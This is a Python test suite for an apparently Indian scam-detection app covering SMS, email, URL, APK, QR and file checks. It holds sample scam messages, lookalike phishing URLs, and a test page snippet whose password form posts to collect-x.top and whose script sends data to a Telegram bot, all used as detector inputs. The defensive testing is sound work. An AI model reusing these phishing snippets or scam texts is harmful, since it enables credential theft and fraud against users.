def test_mymemory_never_shows_an_unrelated_sentence():
    _use_fake_google(mymemory="fuzzy")
    os.environ.pop("TRANSLATE_API_KEY")
    text = "ನಿಮ್ಮ ಬ್ಯಾಂಕ್ ಖಾತೆ ಇಂದು ಬ್ಲಾಕ್ ಆಗುತ್ತದೆ. ತಕ್ಷಣ KYC ಅಪ್‌ಡೇಟ್ ಮಾಡಿ"
    result = add_translation(analyze_text(text), "en")
    assert "translation" not in result, result.get("translation")   # nothing shown instead of nonsense
    assert result["verdict"] == "SCAM_LIKELY"                          # built-in Kannada rules still decide


KN_SCAM = "ನಿಮ್ಮ ಬ್ಯಾಂಕ್ ಖಾತೆ ಇಂದು ಬ್ಲಾಕ್ ಆಗುತ್ತದೆ. ತಕ್ಷಣ KYC ಅಪ್‌ಡೇಟ್ ಮಾಡಿ"


def _fake_gemini_and_bhashini(gemini_status=200, gemini_error="", bhashini=True):
    """Gemini answers with JSON; Bhashini needs a config call then a compute call."""
    calls = _use_fake_google()
    os.environ.pop("TRANSLATE_API_KEY")
    os.environ["GEMINI_API_KEY"] = "g-key"
    if bhashini:
        os.environ["BHASHINI_USER_ID"], os.environ["BHASHINI_API_KEY"] = "uid", "ulca"
    import json as _json

    def fake_post(url, params=None, json=None, headers=None, timeout=None, data=None):
        if "generativelanguage" in url:
            calls.append(("gemini", url, headers.get("x-goog-api-key")))
            if "gemini-flash-lite-latest" in url:
                return _FakeResponse(404, {"error": {"message": "model not found"}})
            if gemini_status != 200:
                return _FakeResponse(gemini_status, {"error": {"message": gemini_error}})
            answer = {"source_language": "kn", "translation": "Your bank account will be blocked today. Update KYC immediately"}
            return _FakeResponse(200, {"candidates": [{"content": {"parts": [{"text": _json.dumps(answer)}]}}]})
        if "getModelsPipeline" in url:
            calls.append(("bhashini-config", headers["userID"], headers["ulcaApiKey"]))
            return _FakeResponse(200, {"pipelineInferenceAPIEndPoint": {"callbackUrl": "https://dhruva.example/infer",
                                       "inferenceApiKey": {"name": "Authorization", "value": "inf-key"}},
                                       "pipelineResponseConfig": [{"config": [{"serviceId": "ai4bharat/indictrans"}]}]})
        if "dhruva" in url:
            calls.append(("bhashini", headers["Authorization"], json["pipelineTasks"][0]["config"]["serviceId"]))
            return _FakeResponse(200, {"pipelineResponse": [{"output": [{"source": "x", "target": "Your bank account will be blocked today"}]}]})
        raise AssertionError(url)

    translator.requests.post = fake_post
    return calls


def test_gemini_translates_first_when_its_key_is_set():
    calls = _fake_gemini_and_bhashini()
    result = add_translation(analyze_text(KN_SCAM), "en")
    assert result["translation"]["provider"] == "gemini" and "blocked" in result["translation"]["text"]
    assert result["translation"]["from"] == "kn"
    assert translator._GEMINI["model"] == translator.GEMINI_MODELS[1]   # skipped the model name that didn't exist
    assert not any(c[0] == "mymemory" for c in calls)


def test_gemini_free_limit_falls_back_to_bhashini():
    calls = _fake_gemini_and_bhashini(429, "Quota exceeded ... GenerateRequestsPerDayPerProjectPerModel-FreeTier")
    result = add_translation(analyze_text(KN_SCAM), "en")
    assert result["translation"]["provider"] == "bhashini", result.get("translation")
    assert ("bhashini", "inf-key", "ai4bharat/indictrans") in calls
    from scanners.quota import quota
    assert quota("gemini").status()["day_closed"]        # not asked again until Google's day ends
    assert result["verdict"] == "SCAM_LIKELY"


def test_our_own_gemini_limit_stops_before_googles():
    calls = _fake_gemini_and_bhashini(bhashini=False)
    from scanners.quota import quota
    quota("gemini").take()
    quota("gemini")._day_used = quota("gemini").per_day                  # today's allowance used
    add_translation(analyze_text(KN_SCAM), "en")
    assert not any(c[0] == "gemini" for c in calls)      # Gemini not called at all



def test_personal_numbers_never_sent_for_translation():
    calls = _fake_gemini_and_bhashini()
    sent = []
    fake = translator.requests.post

    def spy(url, **kw):
        sent.append(str(kw.get("json")))
        return fake(url, **kw)
    translator.requests.post = spy
    text = "ನಿಮ್ಮ ಖಾತೆ 50012345678 ಇಂದು ಬ್ಲಾಕ್. OTP 482913 ಹೇಳಿ. ರಾಹುಲ್ rahul@okaxis ಗೆ +91 98765 43210"
    translator.translate(text, "en")
    assert sent and not any(x in " ".join(sent) for x in ("50012345678", "482913", "rahul@okaxis", "98765 43210")), sent
    masked, secrets = translator.mask_personal(text)
    assert translator.unmask_personal(masked, secrets) == text



def test_sender_rules_trai():
    from scanners.message_scanner import add_sender_checks
    kyc = "Dear customer your SBI account will be blocked today. Update KYC now"
    r = add_sender_checks(analyze_text(kyc), "+91 98765 43210")
    assert any("personal mobile" in p for p in r["patterns_detected"]), r
    r = add_sender_checks(analyze_text(kyc), "AX-SBIINB-P")
    assert any("advert" in p for p in r["patterns_detected"]), r
    r = add_sender_checks(analyze_text("Rs 500 debited from a/c XX1234. Not you? Call 1800 425 3800"), "AX-HDFCBK-T")
    assert r["verdict"] == "LIKELY_SAFE" and r["safe_signals"], r
    r = add_sender_checks(analyze_text("Hey bro, reached home, call you later"), "9876543210")
    assert r["verdict"] == "LIKELY_SAFE", r           # friends texting from a mobile are fine
    r = add_sender_checks(analyze_text("Part time job, earn daily. WhatsApp +84 912 345 678"), "")
    assert any("foreign phone number" in p for p in r["patterns_detected"]), r
    r = add_sender_checks(analyze_text("VM-SBIINB-S\nYour a/c is credited with Rs 2000"), "")
    assert r.get("sender") == "VM-SBIINB-S"          # sender read from the top of a screenshot


INDIAN_SMS_SAMPLES = [  # from the CloveAI india-spam-sms dataset (MIT licence)
    (1, "Get rich quick! Earn ₹7938185397 daily from home. Call Sri Ganganagar"),
    (1, "Hi beautiful! I saw your profile. Want to chat? Reply YES to 9409249465"),
    (1, "Axis Bank: Unusual login detected from new device. Secure your account: http://verify-bank960.com"),
    (1, "Get 50% discount on your 670 electricity bill! Pay only INR 99. Limited time: http://bill-discount536.com"),
    (1, "Your meter will be removed today due to non-payment. Call 848 immediately."),
    (1, "WINNER! You got ₹SBI cashback in your 710 Bank account. Claim now: http://bank-reward4650.in"),
    (1, "PMO India: You are selected for ₹862 grant. Call 297"),
    (1, "Your debit card XXHDFC has been blocked. Call immediately: 314 to reactivate."),
    (0, "Income Tax Dept: Your refund of INR 14882 has been processed. Will be credited in 3-5 days."),
    (0, "UPPCL: Electricity bill for December is INR 3153. Pay by 2025-09-22 to avoid disconnection."),
    (0, "Thank you for using your ICICI Bank Debit Card XX4839 for INR 24776 at 88102."),
    (0, "EPFO: Pension contribution of INR 12676 received for November."),
]


def test_indian_sms_dataset_samples():
    for label, text in INDIAN_SMS_SAMPLES:
        verdict = analyze_text(text)["verdict"]
        assert (verdict != "LIKELY_SAFE") == bool(label), (verdict, text)



def test_email_sender_domain_checks():
    from scanners import email_domain, email_analyzer
    import scanners.url_scanner as us
    saved = (email_domain.dns_query, us.OFFLINE, us.whois_details)
    try:
        us.OFFLINE = False
        email_domain.ensure_disposable_list = lambda offline=False: None
        records = {("ghost-bank-alerts.com", "MX"): "nxdomain",
                   ("sbi-alerts-team.co", "MX"): ["10 mx.sbi-alerts-team.co"], ("sbi-alerts-team.co", "TXT"): [],
                   ("_dmarc.sbi-alerts-team.co", "TXT"): "nxdomain"}
        email_domain.dns_query = lambda name, rtype: records.get((name, rtype), [])
        us.whois_details = lambda d: {"age_days": 6} if d == "sbi-alerts-team.co" else {}
        r = email_analyzer.check_sender_identity("Support", "help@mailinator.com")
        assert any("throwaway" in f for f in r["findings"]), r
        r = email_analyzer.check_sender_identity("Alerts", "noreply@ghost-bank-alerts.com")
        assert any("doesn't exist" in f for f in r["findings"]), r
        r = email_analyzer.check_sender_identity("Alerts", "noreply@sbi-alerts-team.co")
        assert any("registered only 6 days ago" in f for f in r["findings"]), r
    finally:
        email_domain.dns_query, us.OFFLINE, us.whois_details = saved



def _fake_apk(package: str, permissions) -> bytes:
    """A tiny APK whose binary manifest lists the given package and permissions."""
    import struct, zipfile, io
    strs = ["manifest", "package", package] + list(permissions)
    enc = b"".join(struct.pack("<H", len(x)) + x.encode("utf-16-le") + b"\0\0" for x in strs)
    offs, o = [], 0
    for x in strs:
        offs.append(o); o += 2 + len(x) * 2 + 2
    hdr = 28
    pool = struct.pack("<IIIII", len(strs), 0, 0, hdr + 4 * len(strs), 0)
    body = struct.pack(f"<{len(strs)}I", *offs) + enc
    body += b"\0" * (-len(body) % 4)
    sp = struct.pack("<HHI", 0x0001, hdr, hdr + len(body)) + pool + body
    attr = struct.pack("<IIIHBBI", 0xFFFFFFFF, 1, 2, 8, 0, 3, 2)
    el = struct.pack("<HHIII", 0x0102, 16, 36 + len(attr), 0, 0xFFFFFFFF) + struct.pack("<IIHHHHHH", 0xFFFFFFFF, 0, 20, 20, 1, 0, 0, 0) + attr
    axml = struct.pack("<HHI", 0x0003, 8, 8 + len(sp) + len(el)) + sp + el
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("AndroidManifest.xml", axml)
        z.writestr("classes.dex", b"dex\n035")
    return buf.getvalue()


def test_apk_permissions_are_read():
    from scanners.apk_check import analyze_apk, read_manifest
    import zipfile, io
    data = _fake_apk("com.wedding.invite", ["android.permission.RECEIVE_SMS", "android.permission.BIND_ACCESSIBILITY_SERVICE"])
    m = read_manifest(zipfile.ZipFile(io.BytesIO(data)).read("AndroidManifest.xml"))
    assert m["package"] == "com.wedding.invite" and "android.permission.RECEIVE_SMS" in m["permissions"], m
    r = analyze_apk("Wedding Card.apk", data)
    assert r["score"] >= 70 and any("OTP" in f for f in r["findings"]), r
    r = analyze_apk("game.apk", _fake_apk("com.fun.game", ["android.permission.INTERNET"]))
    assert r["score"] == 0, r



def test_email_breach_lookup_free_sources():
    import scanners.password_checker as pc
    real = pc.requests.get
    try:
        def fake(url, **k):
            if "xposedornot" in url:
                if "/found" in url:
                    return _FakeResponse(200, {"breaches": [["Canva", "LinkedIn"]], "status": "success"})
                if "/busy" in url:
                    return _FakeResponse(429, {"Error": "rate limited"})
                return _FakeResponse(200, {"Error": "Not found", "email": None})
            return _FakeResponse(200, {"success": True, "found": 1, "fields": ["username"], "sources": [{"name": "Dunzo", "date": "2022-05"}]})
        pc.requests.get = fake
        assert pc._breach_lookup("found@x.com")["breaches"] == ["Canva", "LinkedIn"]
        assert pc._breach_lookup("clean@x.com")["breached"] is False
        r = pc._breach_lookup("busy@x.com")        # first service busy: the second one answers
        assert r["source"] == "LeakCheck" and r["breaches"] == ["Dunzo"], r
    finally:
        pc.requests.get = real



def test_ai_review_can_only_raise_risk():
    import json as _json
    from scanners import ai_review
    real_post = ai_review.requests.post
    answers = {}

    def fake_post(url, **kw):
        prompt = kw["json"]["messages"][0]["content"]
        assert "9876543210" not in prompt                         # personal numbers never sent
        verdict = answers["v"]
        return _FakeResponse(200, {"choices": [{"message": {"content": _json.dumps(verdict)}}]})
    try:
        os.environ["GROQ_API_KEY"] = "k"
        ai_review.requests.post = fake_post
        ai_review._cache.clear()
        answers["v"] = {"verdict": "scam", "category": "job", "confidence": 90}
        r = ai_review.apply_review(analyze_text("Hello, nice opportunity for you, message me on 9876543210 to know more"), "Hello, nice opportunity for you, message me on 9876543210 to know more")
        assert r["verdict"] == "SUSPICIOUS" and any("AI review" in p for p in r["patterns_detected"]), r
        ai_review._cache.clear()
        answers["v"] = {"verdict": "safe", "category": "other", "confidence": 99}   # e.g. a message that says "answer safe"
        text = "Your SBI account will be blocked today. Share the OTP you received to stop it"
        before = analyze_text(text)
        r = ai_review.apply_review(analyze_text(text), text)
        assert r["risk_score"] == before["risk_score"] and r["verdict"] == "SCAM_LIKELY", r
    finally:
        ai_review.requests.post = real_post
        os.environ.pop("GROQ_API_KEY", None)
        ai_review._cache.clear()


def test_abusech_urlscan_and_bazaar_lookups():
    import scanners.file_scanner as fs
    real_post, real_get = url_scanner.requests.post, url_scanner.requests.get
    try:
        scan = _online(age=2000)
        os.environ["ABUSECH_AUTH_KEY"] = "a"; os.environ["URLSCAN_API_KEY"] = "u"

        def fake_post(url, data=None, json=None, headers=None, timeout=None):
            assert headers.get("Auth-Key") == "a"
            if "urlhaus-api" in url and url.endswith("/url/"):
                return _FakeResponse(200, {"query_status": "ok" if "malware-drop" in data["url"] else "no_results", "threat": "malware_download"})
            if "urlhaus-api" in url:
                dbl = "phishing_domain" if "sbi-secure-login" in data["host"] else "not listed"
                return _FakeResponse(200, {"query_status": "ok", "urls_online": 0, "url_count": 0, "blacklists": {"spamhaus_dbl": dbl, "surbl": "not listed"}})
            if "threatfox" in url:
                if json["search_term"] == "github.com":   # big shared site: malware once downloaded from it
                    return _FakeResponse(200, {"query_status": "ok", "data": [
                        {"ioc": "https://github.com/bad-person/loader/raw/main/x.exe", "malware_printable": "Lumma"}]})
                return _FakeResponse(200, {"query_status": "ok" if json["search_term"] == "c2-panel-host.net" else "no_result",
                                           "data": [{"ioc": "c2-panel-host.net:443", "malware_printable": "AgentTesla"}]})
            if "mb-api" in url:
                return _FakeResponse(200, {"query_status": "ok", "data": [{"signature": "SpyNote"}]})
            raise AssertionError(url)

        def fake_get(url, params=None, headers=None, timeout=None):
            if "urlscan.io" in url:
                hit = "evil-shop-deals.com" in params["q"]
                return _FakeResponse(200, {"results": [{"page": {"domain": "evil-shop-deals.com"}}] if hit else []})
            return real_get(url, params=params, headers=headers, timeout=timeout)
        url_scanner.requests.post, url_scanner.requests.get = fake_post, fake_get
        r = scan("https://files-host.com/malware-drop.exe")
        assert any(c["id"] == "feeds" and c["status"] == "fail" and c["value"] == "URLhaus" for c in r["checks"]), r["checks"]
        r = scan("https://sbi-secure-login.com/")
        assert r["verdict"] == "DANGEROUS" and any(c.get("value") == "Spamhaus" for c in r["checks"]), r["checks"]
        r = scan("https://c2-panel-host.net/")
        assert any(c.get("value") == "ThreatFox" and c["status"] == "fail" for c in r["checks"]), r["checks"]
        r = scan("https://github.com/sathwikraibs/StaySafe")
        assert r["verdict"] == "SAFE", (r["risk_score"], r["findings"])
        r = scan("https://github.com/bad-person/loader/raw/main/x.exe")
        assert r["verdict"] == "DANGEROUS" and any(c.get("value") == "ThreatFox" for c in r["checks"]), r["checks"]
        r = scan("https://evil-shop-deals.com/")
        assert any(c["id"] == "urlscan" and c["status"] == "fail" for c in r["checks"]), r["checks"]
        fs.requests.post = fake_post
        assert fs.check_malwarebazaar("0" * 64) == {"found": True, "signature": "SpyNote"}
    finally:
        url_scanner.requests.post, url_scanner.requests.get = real_post, real_get
        os.environ.pop("ABUSECH_AUTH_KEY", None); os.environ.pop("URLSCAN_API_KEY", None)
        _restore()


def test_connection_uses_proxycheck_and_abuseipdb():
    import scanners.network_checker as nc
    real_get = nc.requests.get
    try:
        os.environ["ABUSEIPDB_KEY"] = "x"

        def fake_get(url, params=None, headers=None, timeout=None):
            if "proxycheck" in url:
                return _FakeResponse(200, {"status": "ok", "5.6.7.8": {"provider": "M247", "country": "India", "isocode": "IN",
                                           "region": "Karnataka", "city": "Bengaluru", "timezone": "Asia/Kolkata", "proxy": "yes", "type": "VPN"}})
            if "abuseipdb" in url:
                return _FakeResponse(200, {"data": {"abuseConfidenceScore": 80, "totalReports": 40}})
            return _FakeResponse(500, {})
        nc.requests.get = fake_get
        r = nc.analyze_ip("5.6.7.8", "Asia/Kolkata")
        assert any(c["id"] == "net_vpn" and c["status"] == "warn" for c in r["checks"]), r
        assert any(c["id"] == "net_abuse" and c["status"] == "warn" for c in r["checks"]), r
        assert r["location"].startswith("Bengaluru"), r
    finally:
        nc.requests.get = real_get
        os.environ.pop("ABUSEIPDB_KEY", None)



def test_score_breakdown_always_adds_up():
    from scanners.message_scanner import add_sender_checks, finalize_parts
    from scanners.qr_scanner import analyze_upi_string, analyze_qr_data
    from scanners.password_checker import analyze_strength
    total = lambda r: sum(p["points"] for p in r["score_parts"])
    for u in ["http://sbi-kyc-update.xyz/login", "https://amaz0n-offers.com/claim", "https://www.google.com/",
              "https://bit.ly/abc", "http://192.168.1.5/x", "https://x.vercel.app/login"]:
        r = scan_url(u)
        assert total(r) == r["risk_score"], (u, r["risk_score"], r["score_parts"])
    for m in ["Your SBI account will be blocked today. Share the OTP now http://sbi-kyc.xyz",
              "Your OTP is 1234. Do not share this OTP with anyone", "Hi, see you at 5", "Earn Rs 3000 daily from home"]:
        r = finalize_parts(check_links_in_result(add_sender_checks(analyze_text(m), "+91 98765 43210")))
        assert total(r) == r["risk_score"], (m, r)
    for q in ["upi://pay?pa=9876543210@ybl&am=15000&tn=refund", "upi://pay?pa=shop@okaxis&pn=Shop",
              "Congratulations you won a lottery, pay processing fee to claim"]:
        r = analyze_upi_string(q) if q.startswith("upi") else analyze_qr_data(q)
        assert total(r) == r["risk_score"], (q, r)
    assert analyze_qr_data("Congratulations you won a lottery, pay processing fee to claim")["verdict"] != "SAFE"



def test_email_and_file_breakdown_adds_up():
    from flask import Flask
    from scanners.email_analyzer import email_analyzer_bp
    from scanners.file_scanner import file_scanner_bp
    import io
    app = Flask(__name__)
    app.register_blueprint(email_analyzer_bp); app.register_blueprint(file_scanner_bp)
    c = app.test_client()
    r = c.post("/api/scan-email", json={"sender_email": "SBI Care <sbi.alerts2026@gmail.com>", "subject": "KYC pending",
                                        "body": "Your account will be blocked today. Update KYC: http://sbi-kyc.xyz/update"}).get_json()
    assert sum(p["points"] for p in r["score_parts"]) == r["risk_score"] and r["risk_score"] > 0, r
    r = c.post("/api/scan-file", data={"file": (io.BytesIO(b"MZ" + b"\0" * 200), "invoice.pdf.exe")},
               content_type="multipart/form-data").get_json()
    assert sum(p["points"] for p in r["score_parts"]) == r["risk_score"] and r["risk_score"] > 0, r



def test_items_inside_messages_are_checked():
    from scanners.message_scanner import add_entity_checks
    r = add_entity_checks(analyze_text("Pay the processing fee of Rs 500 to 9876543210@ybl to receive your prize"))
    assert any("UPI ID" in p for p in r["patterns_detected"]) and r["verdict"] == "SCAM_LIKELY", r
    r = add_entity_checks(analyze_text("Contact support at help@mailinator.com for your refund"))
    assert any("throwaway" in p for p in r["patterns_detected"]), r
    r = add_entity_checks(analyze_text("My email is rahul@gmail.com, UPI rahul@okaxis for the trip"))
    assert r["verdict"] == "LIKELY_SAFE", r
    assert analyze_text("Your Paytm wallet is blocked. Verify now")["verdict"] != "LIKELY_SAFE"


def test_sender_box_takes_anything():
    from scanners.email_analyzer import split_sender, name_matches_address
    assert split_sender("support [at] paytm-help [dot] com") == ("", "support@paytm-help.com")
    assert split_sender('From: "HDFC Bank" <alerts @ hdfcbank.net>') == ("HDFC Bank", "alerts@hdfcbank.net")
    assert split_sender("ManageEngine <itom-promotions@itominfo.manageengine.com")[1] == "itom-promotions@itominfo.manageengine.com"
    assert name_matches_address("ManageEngine", "itom-promotions@itominfo.manageengine.com") is True
    assert name_matches_address("State Bank of India", "sbi@alerts.sbi.co.in") is True
    assert name_matches_address("PayZone Support", "x@mail-center.co") is False



def test_screenshot_link_dot_fix_only_for_names_that_dont_exist():
    from scanners import message_scanner as ms
    real = url_scanner.resolve_host
    try:
        url_scanner.resolve_host = lambda h: {"exists": h in ("incometaxlgov.in",), "ips": []}
        assert ms.fix_ocr_links("visit TRAILGOV.IN now") == "visit TRAI.GOV.IN now"
        assert ms.fix_ocr_links("go to incometaxlgov.in") == "go to incometaxlgov.in"   # a real lookalike stays
    finally:
        url_scanner.resolve_host = real


def test_translate_route_and_message_language():
    import app as appmod
    from scanners import translator
    c = appmod.app.test_client()
    real = translator.translate
    try:
        translator.translate = lambda text, to, **k: {"text": "Your account will be blocked", "from": "kn", "to": to}
        r = c.post("/api/translate", json={"text": "ನಿಮ್ಮ ಖಾತೆ ಬ್ಲಾಕ್ ಆಗುತ್ತದೆ", "to": "en"})
        assert r.status_code == 200 and r.get_json()["text"] == "Your account will be blocked", r.get_json()
        assert c.post("/api/translate", json={"text": "hi", "to": "xx"}).status_code == 400
        translator.translate = lambda text, to, **k: None
        assert c.post("/api/translate", json={"text": "hi", "to": "kn"}).status_code == 503
    finally:
        translator.translate = real
    from scanners.message_scanner import add_translation, analyze_text
    translator_real = translator.translate
    try:
        translator.translate = lambda text, to, **k: None
        assert add_translation(analyze_text("ನಿಮ್ಮ ಖಾತೆ ಇಂದು ಬ್ಲಾಕ್ ಆಗುತ್ತದೆ"), "en")["message_language"] == "kn"
        assert add_translation(analyze_text("Your parcel is waiting"), "kn")["message_language"] == "en"
    finally:
        translator.translate = translator_real


def test_tulu_translation_uses_gemini_then_kannada():
    from scanners import translator
    real = translator._gemini, translator._google, translator._mymemory, translator._bhashini
    try:
        translator._cache.clear()
        translator._gemini = lambda text, target, *a: {"text": "ಈರೆನ ಖಾತೆ ಬ್ಲಾಕ್ ಆಪುಂಡು", "from": "en", "to": target, "provider": "gemini"}
        out = translator.translate("Your account will be blocked", "tcy")
        assert out["to"] == "tcy" and out["text"].startswith("ಈರೆನ"), out
        translator._cache.clear()
        translator._gemini = lambda text, target, *a: None
        translator._google = translator._bhashini = lambda text, target: None
        translator._mymemory = lambda text, target: {"text": "ನಿಮ್ಮ ಖಾತೆ ಬ್ಲಾಕ್ ಆಗುತ್ತದೆ", "from": "en", "to": target, "provider": "mymemory"}
        out = translator.translate("Your account will be blocked today", "tcy")
        assert out["to"] == "kn", out
        assert "tcy" in translator.LANGUAGE_NAMES and not translator._looks_like_translation("abc", "hello there", "tcy")
    finally:
        translator._gemini, translator._google, translator._mymemory, translator._bhashini = real
        translator._cache.clear()


def test_hard_link_cases_from_india():
    """Address-only checks (no lookups): scam stories told by several ordinary words, brand names on
    other websites, app files on big file-sharing sites, and short links named after banks."""
    risky = ["https://dtdc-courier-redelivery.com", "https://cbi-arrest-warrant.in", "https://trai-number-block.com",
             "https://task-earn-daily.in", "https://sbionline.in", "https://phonepay-cashback.in",
             "https://drive.google.com/uc?id=1xyz&export=download&name=SBI_YONO.apk",
             "https://www.mediafire.com/file/abc/PM_Kisan.apk/file", "https://bit.ly/3sbi-kyc",
             "https://evil-example.com/www.itau.com.br/login"]
    for u in risky:
        r = scan_url(u)
        assert r["verdict"] != "SAFE", (u, r["risk_score"], r["findings"])
    for u in ["https://www.trainman.in", "https://p.paytm.me/xCTH/abc", "https://phon.pe/abc123", "https://bit.ly/",
              "https://github.com/someone/example.com", "https://www.redbus.in", "https://www.policybazaar.com"]:
        r = scan_url(u)
        assert r["verdict"] == "SAFE", (u, r["risk_score"], r["findings"])


def test_bank_moving_to_bank_in_is_not_a_secret_redirect():
    r = _scan_online("https://www.karnatakabank.com", page={"final_url": "https://www.karnatakabank.bank.in/", "hops": [1]})
    assert r["verdict"] == "SAFE" and not any("secretly" in f for f in r["findings"]), r["findings"]
    r = _scan_online("https://karnatakabank-kyc.com", page={"final_url": "https://evil-pay.top/", "hops": [1]})
    assert any("secretly" in f for f in r["findings"]), r["findings"]


def test_file_tricks_from_the_live_test_sets():
    """Every sample in the owner's live file test gives the expected answer offline too."""
    from scanners.file_scanner import scan_file_bytes
    from scanners.selftest_files import file_sets
    from scanners.selftest import _right
    for key, (title, cases) in file_sets().items():
        for name, data, expect in cases:
            r = scan_file_bytes(name, data, use_vt=False)
            assert _right(expect, r["verdict"]), (title, name, r["verdict"], r["risk_score"], r["findings"])


def test_known_software_list_never_hides_strong_findings():
    import scanners.file_scanner as fs
    from scanners.selftest_files import EICAR
    real = fs.check_known_good
    try:
        fs.check_known_good = lambda sha: {"known": True, "source": "eicar.com"}
        r = fs.scan_file_bytes("eicar.com", EICAR, use_vt=False)
        assert r["verdict"] == "DANGEROUS", (r["risk_score"], r["findings"])
        r = fs.scan_file_bytes("setup.exe", b"MZ" + b"\0" * 100, use_vt=False)
        assert r["verdict"] == "SAFE", (r["risk_score"], r["findings"])     # a genuine installer stays fine
    finally:
        fs.check_known_good = real


def test_blind_mode_ignores_lists():
    scan = _online(gsb=True, vt={"status": "ok", "malicious": 9, "suspicious": 0, "harmless": 0, "engines": 90, "domain_malicious": 9})
    try:
        assert scan("https://plain-shop-example.com/")["verdict"] == "DANGEROUS"
        r = url_scanner.scan_url("https://plain-shop-example.com/", blind=True)
        assert r["verdict"] == "SAFE" and not any(c["id"] in ("google", "virustotal") and c["status"] == "fail"
                                                   for c in r["checks"]), r["checks"]
    finally:
        _restore()


def test_page_tricks_and_crypto_lookalikes():
    from scanners.url_scanner import _page_tricks
    t = _page_tricks('<form action="https://collect-x.top/p.php"><input type=password></form>'
                     '<script>fetch("https://api.telegram.org/bot123:abc/sendMessage")</script>', "https://shop-x.com/login")
    assert t["telegram_exfil"] and t["form_to"] == "collect-x.top", t
    assert _page_tricks('<form action="/login"><input type=password></form>', "https://bank.example.com/")["form_to"] == ""
    assert _page_tricks("<script>window.location='https://evil-x.top/a'</script>", "https://a.com/")["js_redirect"]
    r = _scan_online("https://plain-shop-example.com/", page={"has_password": True, "telegram_exfil": True, "title": "Sign in"})
    assert r["verdict"] == "DANGEROUS", (r["risk_score"], r["findings"])
    r = _scan_online("https://plain-shop-example.com/", page={"text": "enter your 12-word recovery phrase to restore your wallet"})
    assert r["verdict"] == "DANGEROUS", (r["risk_score"], r["findings"])
    for u in ["http://ur-exods.pages.dev/x", "http://start-ledgerlive-com-web.typedream.app", "https://my-metamsk-wallet.com"]:
        assert scan_url(u)["verdict"] == "DANGEROUS", u
    for u in ["https://www.ledgerbook-accounting.com", "https://owata-net.com", "https://www.ledger.com"]:
        assert scan_url(u)["verdict"] != "DANGEROUS", (u, scan_url(u)["findings"])


def test_fresh_scam_patterns_from_blind_test():
    for u in ["http://vmi3580221.contaboserver.net/rdwa/rd/rd/msg.php", "http://app-exodusweb.pages.dev/x",
              "http://curemypc.myvnc.com/cgi-bin/index.ha", "http://zoominvite07.pages.dev", "http://shopee7677.blogspot.com/",
              "http://nltavaconsulting.com/space/r.html#galis@3398cb06b10be.org"]:
        assert scan_url(u)["verdict"] != "SAFE", (u, scan_url(u)["findings"])
    for u in ["https://my-portfolio.vercel.app", "https://www.zoom.us", "https://shopee.co.id", "https://www.adobe.com"]:
        assert scan_url(u)["verdict"] == "SAFE", (u, scan_url(u)["findings"])


def test_indian_messages_in_every_language():
    """The owner's live message test samples give the right answer from the rules alone too."""
    from scanners.selftest_messages import MESSAGES
    from scanners.message_scanner import add_entity_checks
    for key, (title, cases) in MESSAGES.items():
        if key == "6":
            continue
        for text, expect in cases:
            r = check_links_in_result(add_entity_checks(analyze_text(text), text))
            ok = r["verdict"] == "LIKELY_SAFE" if expect == "SAFE" else r["verdict"] in ("SUSPICIOUS", "SCAM_LIKELY")
            assert ok, (title, text, r["verdict"], r["patterns_detected"])


def test_links_wrapped_in_screenshots_are_joined():
    from scanners.message_scanner import join_wrapped_links
    assert "http://sbi-yono-kyc.in/update" in join_wrapped_links("clicking http://sbi-\nyono-kyc.in/update now")
    assert join_wrapped_links("http://a.com/\nThe end") == "http://a.com/\nThe end"
    assert join_wrapped_links("see https://sbi.co.in\nThanks") == "see https://sbi.co.in\nThanks"


if __name__ == "__main__":
    tests = [(n, f) for n, f in sorted(globals().items()) if n.startswith("test_") and callable(f)]
    failed = 0
    for name, fn in tests:
        try:
            fn()
            print(f"PASS  {name}")
        except AssertionError as e:
            failed += 1
            print(f"FAIL  {name}: {e}")
    print(f"\n{len(tests) - failed}/{len(tests)} tests passed")
    sys.exit(1 if failed else 0)
